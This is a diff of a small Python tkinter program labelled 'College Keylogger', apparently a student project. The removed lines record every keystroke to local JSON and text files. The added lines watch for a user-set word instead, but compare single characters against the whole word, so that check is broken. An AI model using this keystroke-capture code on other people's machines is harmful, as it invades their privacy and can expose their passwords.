@@ -1,55 +1,25 @@
-
 import tkinter as tk
 from tkinter import *
 from pynput import keyboard
-import json
 
-keys_used = []
-flag = False
-keys = ""
+target_word = ""
 
-def generate_text_log(key):
-    with open('keytext_log.txt',"w+") as keys:
-        keys.write(key)
-
-def generate_json_file(keys_used):
-    with open('keyjson_log.json', '+wb') as key_log:
-        key_list_bytes = json.dumps(keys_used).encode() 
-        key_log.write(key_list_bytes)
-    
 def on_press(key):
-    global flag, keys_used, keys
-    if flag == False:
-        keys_used.append(
-            {'Pressed':f'{key}'}
-        )
-        flag = True
-    
-    if flag == True:
-        keys_used.append(
-            {'Held':f'{key}'}
-        )
-    generate_json_file(keys_used)
+    global target_word
+    try:
+        current_key = key.char
+    except AttributeError:
+        # Handle special keys like 'space', 'enter', etc.
+        current_key = str(key)
 
-
-def on_release(key):
-    global flag, keys_used, keys
-    keys_used.append(
-        {'Released':f'{key}'}
-    )
-
-    if flag == True:
-        flag = False
-    generate_json_file(keys_used)
-
-    keys = keys+str(key)
-    generate_text_log(str(keys))
+    if current_key == target_word:
+        print(f"Target word '{target_word}' typed!")
 
 def start_keylogger():
     global listener
-    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    listener = keyboard.Listener(on_press=on_press)
     listener.start()
-    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
+    label.config(text=f"[+] Keylogger is running!\n[!] Monitoring for word: '{target_word}'")
     start_button.config(state='disabled')
     stop_button.config(state='normal')
 
@@ -60,12 +30,24 @@ def stop_keylogger():
     start_button.config(state='normal')
     stop_button.config(state='disabled')
 
-root = Tk()
-root.title("Keylogger")
+def set_target_word():
+    global target_word
+    target_word = entry.get()
+    label.config(text=f"[!] Monitoring for word: '{target_word}'")
 
-label = Label(root, text='Click "Start" to begin keylogging.')
+# GUI
+root = Tk()
+root.title("College Keylogger")
+
+label = Label(root, text='Enter the word to monitor:')
 label.config(anchor=CENTER)
 label.pack()
+
+entry = Entry(root)
+entry.pack()
+
+set_word_button = Button(root, text="Set Word", command=set_target_word)
+set_word_button.pack()
 
 start_button = Button(root, text="Start", command=start_keylogger)
 start_button.pack(side=LEFT)
@@ -73,11 +55,8 @@ start_button.pack(side=LEFT)
 stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
 stop_button.pack(side=RIGHT)
 
-root.geometry("250*250") 
-
 root.mainloop()
 
+    
 
-
-
-
+     
